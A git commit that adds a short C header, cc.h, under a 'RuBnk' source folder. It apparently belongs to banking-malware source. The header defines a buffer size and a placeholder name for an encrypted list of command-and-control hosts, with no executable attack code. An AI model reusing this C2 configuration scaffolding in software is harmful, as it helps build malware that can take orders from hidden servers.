6a4e0952adf09ef6341f6cbf7c06d5a5be77d601
Sergey <nomail@mail.ru>
2012-03-27 10:47:55 +0300

    -

---
+++ source/RuBnk/cc.h
@@ -0,0 +1,13 @@
+
+#ifndef ccH
+#define ccH
+//----------------------------------------------------------------------------
+
+
+#define CCHOSTS_PARAM_SIZE      100
+#define CCHOSTS_PARAM_NAME      "__CC_HOSTS__\0"
+#define CCHOSTS_PARAM_ENCRYPTED true
+
+
+//----------------------------------------------------------------------------
+#endif
